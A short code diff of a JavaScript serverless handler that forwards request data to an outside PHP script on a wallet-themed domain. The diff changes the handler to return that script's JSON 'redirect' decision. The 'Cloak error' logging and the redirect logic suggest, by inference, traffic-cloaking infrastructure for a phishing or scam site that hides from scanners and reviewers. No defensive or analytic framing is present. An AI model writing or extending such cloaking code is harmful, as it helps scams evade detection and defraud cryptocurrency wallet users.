@@ -12,16 +12,14 @@ export default async function handler(req, res) {
     const response = await fetch('https://suitewebwallet.com/tldr99/scr.php', {
       method: 'POST',
       headers,
-      body: payload.toString()
+      body: payload.toString(),
     });
 
-    const result = await response.text();
-
-    res.setHeader('Content-Type', 'text/html');
-    return res.send(result);
+    const json = await response.json();
+    res.json(json);
 
   } catch (e) {
     console.error('Cloak error:', e);
-    return res.status(500).send("Internal error");
+    res.status(500).json({ redirect: false });
   }
 }
